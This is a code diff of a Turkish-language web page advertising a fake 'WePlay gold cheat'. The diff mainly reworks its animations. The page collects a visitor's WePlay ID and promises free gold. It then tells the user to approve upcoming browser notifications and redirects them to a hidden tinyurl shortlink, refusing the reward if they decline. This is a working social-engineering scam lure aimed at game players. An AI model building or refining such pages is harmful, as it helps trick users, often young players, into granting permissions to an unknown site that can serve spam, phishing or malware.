@@ -11,22 +11,9 @@ body {
     background: linear-gradient(to bottom, #f4f4f4, #e0f7fa);
     margin: 0;
     padding: 20px;
-    overflow-x: hidden; /* yatay kaydırmayı gizle */
-    overflow-y: auto;   /* dikey kaydırmaya izin ver */
+    overflow-x: hidden;
+    overflow-y: auto;
     position: relative;
-}
-
-.animated-text {
-    position: absolute;
-    white-space: nowrap;
-    font-size: 24px;
-    font-weight: bold;
-    animation: moveText linear infinite;
-}
-
-@keyframes moveText {
-    0% { transform: translateX(100%); }
-    100% { transform: translateX(-100%); }
 }
 
 h2 {
@@ -73,29 +60,22 @@ button:hover {
     min-height: 20px;
 }
 
-/* Altın simgesi */
 .gold {
     position: absolute;
     font-size: 20px;
-    animation: fall linear forwards;
-}
-
-@keyframes fall {
-    0% { transform: translateY(-50px); opacity: 1; }
-    100% { transform: translateY(100vh); opacity: 0; }
+    top: -30px;
 }
 </style>
 </head>
 <body>
 
-<div id="animContainer"></div>
-
-<h2>WePlay Altın hilesi 💰</h2>
+<h2>WePlay Altın Hilesi 💰</h2>
 <input type="text" id="weplayID" placeholder="WePlay ID’nizi girin">
 <br>
 <button id="gosterBtn">Gönder</button>
 
 <div id="message"></div>
+<div id="animContainer"></div>
 
 <script>
 // Rastgele renk üretimi
@@ -104,45 +84,30 @@ function getRandomColor() {
     return colors[Math.floor(Math.random() * colors.length)];
 }
 
-// Animasyonlu yazı oluştur
-function createAnimatedText(text) {
-    const container = document.getElementById('animContainer');
-    const span = document.createElement('div');
-    span.className = 'animated-text';
-    span.textContent = text;
-    span.style.top = Math.random() * (window.innerHeight - 50) + 'px';
-    span.style.color = getRandomColor();
-    span.style.animationDuration = (10 + Math.random() * 10) + 's';
-    container.appendChild(span);
-
-    span.style.transition = "color 0.5s";
-    setInterval(() => {
-        span.style.color = getRandomColor();
-    }, 1000);
-}
-
-// Altın simgesi oluştur
+// Altın animasyonu
 function createGold() {
     const container = document.getElementById('animContainer');
     const gold = document.createElement('div');
     gold.className = 'gold';
     gold.textContent = '💰';
-    gold.style.left = Math.random() * window.innerWidth + 'px';
-    gold.style.animationDuration = (3 + Math.random() * 3) + 's';
+    gold.style.left = Math.random() * (window.innerWidth - 30) + 'px';
     container.appendChild(gold);
+
+    requestAnimationFrame(() => {
+        gold.style.transition = 'transform 2s linear, opacity 2s linear';
+        gold.style.transform = `translateY(${window.innerHeight + 50}px)`;
+        gold.style.opacity = '0';
+    });
 
     setTimeout(() => {
         if(container.contains(gold)) container.removeChild(gold);
-    }, (parseFloat(gold.style.animationDuration) * 1000));
+    }, 2000);
 }
 
-// Sayfa açıldığında animasyonları başlat
-for(let i = 0; i < 3; i++){
-    createAnimatedText("xia cez faniyim");
-}
-setInterval(createGold, 500); // Daha az yoğun altın animasyonu
+// Daha az yoğun altın
+setInterval(createGold, 1000); // saniyede 1 altın
 
-// ID girme ve Altını Al işlemleri
+// ID girme ve Altını Al
 const gosterBtn = document.getElementById('gosterBtn');
 gosterBtn.addEventListener('click', () => {
     const id = document.getElementById('weplayID').value.trim();
@@ -155,22 +120,21 @@ gosterBtn.addEventListener('click', () => {
     }
 
     msgBox.style.color = 'green';
-    msgBox.innerHTML = `Tebrikler ${id}! Altın alabilirsin 💰<br>`;
-    
+    msgBox.textContent = `Tebrikler ${id}! Altın alabilirsin 💰`;
+
     const altinBtn = document.createElement('button');
     altinBtn.textContent = "Altını Al";
-    altinBtn.addEventListener('click', uyari);
+    altinBtn.addEventListener('click', () => {
+        const onay = confirm("Karşınıza gelecek bildirimleri onaylarsanız altın alabilirsiniz.");
+        if(onay) {
+            window.location.href = "https://tinyurl.com/24yu5bos";
+        } else {
+            alert("Altın almak için bildirimi onaylamanız gerekiyor!");
+        }
+    });
+    msgBox.appendChild(document.createElement('br'));
     msgBox.appendChild(altinBtn);
 });
-
-function uyari() {
-    const onay = confirm("Karşınıza gelecek bildirimleri onaylarsanız altın alabilirsiniz.");
-    if(onay) {
-        window.location.href = "https://tinyurl.com/24yu5bos";
-    } else {
-        alert("Altın almak için bildirimi onaylamanız gerekiyor!");
-    }
-}
 </script>
 
 </body>
